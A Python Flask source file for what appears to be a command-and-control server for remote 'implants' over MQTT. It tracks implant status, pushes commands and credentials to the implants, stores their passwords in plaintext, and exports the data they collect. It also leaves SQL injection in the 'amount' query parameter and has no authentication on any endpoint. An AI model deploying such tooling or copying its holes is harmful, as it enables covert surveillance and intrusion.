import flask
import json
from flask import render_template
import os
from django.core.serializers.json import DjangoJSONEncoder
from flask_cors import CORS
from flask import request, redirect, jsonify, Response
from io import StringIO
import datetime
import urllib.request
import mariadb
import paho.mqtt.client as mqtt
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import time
import os
import re

app = flask.Flask(__name__)
app.config["DEBUG"] = True
app.config['JSONIFY_PRETTYPRINT_REGULAR'] = True
CORS(app)

mqtt_hostname = "mqtt"

limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["10 per second"]
)

# configuration used to connect to MariaDB
config = {
    'host': os.getenv('MYSQL_HOST'),
    'port': int(os.getenv('MYSQL_PORT')),
    'user': os.getenv('MYSQL_USER'),
    'password': os.getenv('MYSQL_PASSWORD'),
    'database': os.getenv('MYSQL_DATABASE'),
    'autocommit': True
}

try:
    print("Trying to connect to MQTT server " + mqtt_hostname)
    client = mqtt.Client()
    client.connect(mqtt_hostname, keepalive=60)
    print("Connection to MQTT has been setup")
    client.loop_start()
except Exception as e:
    print("Connecting to MQTT server failed, Exception error: " + str(e))

for attempt_number in range(12):
    try:
        print("Trying to connect to MariaDB server with config: " + str(config))
        conn = mariadb.connect(**config)
        cur = conn.cursor()
        print("Connection to MariaDB has been setup")
        break
    except Exception as e:
        print("Connecting to MariaDB server failed, Exception error: " + str(e))
        print("Attempting again...")
        time.sleep(5)
        attempt_number += 1
    if attempt_number >= 99:
        print("Failed to connect to MariaDB")
        raise Exception

def execute_mariadb_query(query):
    try:
        print("Pinging database connection.")
        conn.ping()
        print("Executing query")
        cur.execute(query)
        row_headers=[x[0] for x in cur.description]
        rv = cur.fetchall()
        return row_headers, rv
    except NameError:
        print("Please bring all docker containers down, and afterwards up again. Contact support if this does not solve it.")
    except:
        print("The database has gone away -- reconnecting.")
        conn.reconnect()
        print("Executing query")
        cur.execute(query)
        row_headers=[x[0] for x in cur.description]
        rv = cur.fetchall()
        return row_headers, rv

@app.route('/api/data', methods=['GET'])
def get_data():
   # execute a SQL statement
   amount_of_results = request.args.get('amount')

   if amount_of_results == "all" or amount_of_results is None:
       query = "select * from data"
   else:
       query = "select * from data order by value_timestamp desc limit {}".format(str(amount_of_results))
       
   row_headers, rv = execute_mariadb_query(query)

   json_data=[]
   for result in rv:
        json_data.append(dict(zip(row_headers,result)))
   #dumpert = [line.replace('\u0000','') for line in json_data]
   #return the results!
   for line in json_data:
      eng = line['value']
      eng = eng.replace('\u0000','')
      line['value'] = eng

   return json.dumps(json_data, cls=DjangoJSONEncoder)

@app.route('/api/allrawstatus', methods=['GET'])
def get_all_raw_implant_status():
   query = 'select * from topics where topic = "$SYS/broker/log/N"'

   row_headers, rv = execute_mariadb_query(query)

   json_data=[]
   for result in rv:
        json_data.append(dict(zip(row_headers,result)))
   topic_id = json_data[0]["topic_id"]

   query = "select * from data where topic_id = {}".format(str(topic_id))

   row_headers, rv = execute_mariadb_query(query)

   json_data=[]
   for result in rv:
        json_data.append(dict(zip(row_headers,result)))
   #dumpert = [line.replace('\u0000','') for line in json_data]
   #return the results!
   for line in json_data:
      eng = line['value']
      eng = eng.replace('\u0000','')
      line['value'] = eng
   return json.dumps(json_data, cls=DjangoJSONEncoder)

@app.route('/api/status', methods=['GET'])
def get_all_implant_status():
    json_data = json.loads(get_all_raw_implant_status())

    status = {}

    for i in json_data:
        connect = re.search("New client connected from (.*) as (.*) \((.*)\).", i["value"])
        disconnect = re.search("Socket error on client (.*), disconnecting.", i["value"])
        disconnect2 = re.search("Client (.*) has exceeded timeout, disconnecting.", i["value"])

        if connect:
            client_id = connect[2]
            if client_id:
                status[client_id] = [i["value_timestamp"], "Online"]

        if disconnect:
            client_id = disconnect[1]
            if client_id:
                status[client_id] = [i["value_timestamp"], "Offline"]

        if disconnect2:
            client_id = disconnect2[1]
            if client_id:
                status[client_id] = [i["value_timestamp"], "Offline"]

    status_clean = []

    for item in status:
        if not re.search("^auto-.{8}-.{4}-.{4}-.{4}-.{12}$", item):
            if not str(item) == "":
                status_clean.append({"Implant ID": item, "Status": status[item][1], "Current status since": status[item][0]})
   
    return json.dumps(status_clean, cls=DjangoJSONEncoder)

@app.route('/api/topics', methods=['GET'])
def get_mqtt_topics():
   query = "select * from topics"

   row_headers, rv = execute_mariadb_query(query)

   json_data=[]
   for result in rv:
        json_data.append(dict(zip(row_headers,result)))

   # return the results!
   return json.dumps(json_data, cls=DjangoJSONEncoder)

@app.route('/api/commands', methods=['POST'])
def execute_commando():
    data = request.form
    print("Received data: " + str(data))

    implantid = request.form.getlist('Implant ID')[0]
    implantlocation = request.form.getlist('Implant Location')[0]
    implantproject = request.form.getlist('Implant Project')[0]
    command = request.form.getlist('command')[0]

    topic = implantproject + "/" + implantid + "/send"
    payload = command

    if payload == "SLEEP":
        stime = request.form.getlist('sleep_time')[0]
        stime = int(stime) * 60000
        payload = "sleep_for;" + str(stime)

    if payload == "PUSH_CONFIG":
        SITE_ROOT = os.path.realpath(os.path.dirname(__file__))
        json_url = os.path.join(SITE_ROOT, 'data.json')
        json_data = json.load(open(json_url))
        
        for ids in json_data:
            if implantid == ids['Implant ID']:
                implant_id_conf = ids["Implant ID"]
                implantproject_conf = ids["Implant Project"]
                dns = ids["DNS"]
                #hours = result["Workhours (UTC)"]
                username = ids["Username"]
                password = ids["Password"]
                break

        payload = "send_config;true;" + dns + ";" + implant_id_conf + ";" + password + ";" + username + ";" + implantproject_conf + "/" + implant_id_conf + "/send;" + implantproject_conf + "/" + implant_id_conf + "/receive;"

    try:
        print("Trying to publish to server " + mqtt_hostname + " to topic " + topic + " with payload " + payload)
        client.publish(topic=topic,payload=payload)
        print("Publish was successful")
    except Exception as e:
        print("Publishing to mosquitto server failed, Exception error: " + str(e))

    return redirect("/index.html", code=302)

@app.route('/api/create/config', methods=['POST'])
def create_implant_config():
    SITE_ROOT = os.path.realpath(os.path.dirname(__file__))
    json_url = os.path.join(SITE_ROOT, 'data.json')
    json_data = json.load(open(json_url))
    ID = request.form['Implant ID']
    #print(request.form)
    result = request.form.to_dict(flat=False)

    ID = result["Implant ID"][0]
    name = result["Implant Project"][0]
    location = result["Implant Location"][0]
    DNS = result["DNS"][0]
    hours = result["Workhours (UTC)"][0]
    username = result["Username"][0]
    password = result["Password"][0]

    data = {"Implant ID": ID, "Implant Project": name, "Implant Location": location, "DNS": DNS, "Workhours (UTC)": hours, "Username": username, "Password": password}
    json_data.append(data)
    with open(json_url, 'w') as outfile:
        json.dump(json_data, outfile)

    return redirect("/implants.html", code=302)

@app.route('/api/delete/config', methods=['POST'])
def delete_implant_config():
    SITE_ROOT = os.path.realpath(os.path.dirname(__file__))
    json_url = os.path.join(SITE_ROOT, 'data.json')
    json_data = json.load(open(json_url))
    ID = request.form['Implant ID']
    #print(json_data[int(ID)])
    #print(request.form)

    counter = 0
    for ids in json_data:
        if ID == ids['Implant ID']:
            del json_data[counter]
            with open(json_url, 'w') as outfile:
                json.dump(json_data, outfile)
        counter += 1

    return redirect("/implants.html", code=302)

@app.route('/api/update/config', methods=['POST'])
def update_implant_config():
    SITE_ROOT = os.path.realpath(os.path.dirname(__file__))
    json_url = os.path.join(SITE_ROOT, 'data.json')
    json_data = json.load(open(json_url))
    ID = request.form['current Implant ID']
    #print(json_data[int(ID)])
    #print(request.form)

    counter = 0
    for ids in json_data:
        if ID == ids['Implant ID']:
            for value in request.form:
                print(value)
                print(counter)
                json_data[counter][value] = request.form[value]
            with open(json_url, 'w') as outfile:
                json.dump(json_data, outfile)
        counter += 1

    return redirect("/implants.html", code=302)

@app.route('/api/get/config', methods=['GET'])
def get_implant_config():
    SITE_ROOT = os.path.realpath(os.path.dirname(__file__))
    json_url = os.path.join(SITE_ROOT, 'data.json')
    json_data = json.load(open(json_url))
    return json.dumps(json_data, cls=DjangoJSONEncoder)

@app.route('/api/get/topics_implant', methods=['GET'])
def get_topics_for_implant():
    SITE_ROOT = os.path.realpath(os.path.dirname(__file__))
    json_data = json.loads(get_mqtt_topics())
    project = request.args.get('project')
    implant_id = request.args.get('implant_id')
    name = project + "/" + implant_id
    topics_final = {}
    for topics in json_data:
        for key in topics:
            if key == "topic":
                if name in topics[key]:
                    topics_final[topics['topic_id']] = topics[key]
    return json.dumps(topics_final, cls=DjangoJSONEncoder)

@app.route('/api/download/export', methods=['GET'])
def export_data():
    SITE_ROOT = os.path.realpath(os.path.dirname(__file__))
    json_data = json.loads(get_mqtt_topics())
    json_data2 = json.loads(get_data())
    project = request.args.get('Implant Project')
    implant_id = request.args.get('Implant ID')
    implant_location = request.args.get('Implant Location')
    datetimes = request.args.get('datetimes')
    soort = request.args.get('type')
    output = ""
    times = datetimes.split(' - ')
    starttime = times[0]
    endtime = times[1]
    starttime = datetime.datetime.strptime(starttime, '%d/%m/%Y %I:%M %p')
    endtime = datetime.datetime.strptime(endtime, '%d/%m/%Y %I:%M %p')

    name = project + "/" + implant_id
    topics_final = {}
    for topics in json_data:
        for key in topics:
            if key == "topic":
                if name in topics[key]:
                    topics_final[topics['topic_id']] = topics['topic_id']

    if soort == "Without timestamps":
        filenaampie = "export_without_timestamps.txt"
        for data in json_data2:
            if data['topic_id'] in topics_final:
                mqtt_time = data['value_timestamp']
                try:
                    mqtt_time = datetime.datetime.strptime(str(mqtt_time), '%Y-%m-%dT%H:%M:%S.%f')
                except:
                    mqtt_time = datetime.datetime.strptime(str(mqtt_time), '%Y-%m-%dT%H:%M:%S')
                if starttime < mqtt_time < endtime:
                    output = output + data['value']
                else:
                    output = output
    elif soort == "With timestamps":
        filenaampie = "export_with_timestamps.txt"
        for data in json_data2:
            if data['topic_id'] in topics_final:
                mqtt_time = data['value_timestamp']
                try:
                    mqtt_time = datetime.datetime.strptime(str(mqtt_time), '%Y-%m-%dT%H:%M:%S.%f')
                except:
                    mqtt_time = datetime.datetime.strptime(str(mqtt_time), '%Y-%m-%dT%H:%M:%S')
                if starttime < mqtt_time < endtime:
                    output = output + data['value_timestamp'] + " - " + data['value'] + " - " + str(data['topic_id']) + "\n"
                else:
                    output = output
    else:
        print("Error in soort")

    string_out = StringIO()
    string_out.write(output)
    returnfile = string_out.getvalue()

    #return redirect("https://localhost:8080/index.html", code=302)
    return Response(returnfile, mimetype="text/plain", headers={"Content-disposition": "attachment; filename=" + filenaampie})


app.run(host='0.0.0.0', ssl_context=('flask.crt', 'flask.key'), port=8443, threaded=True)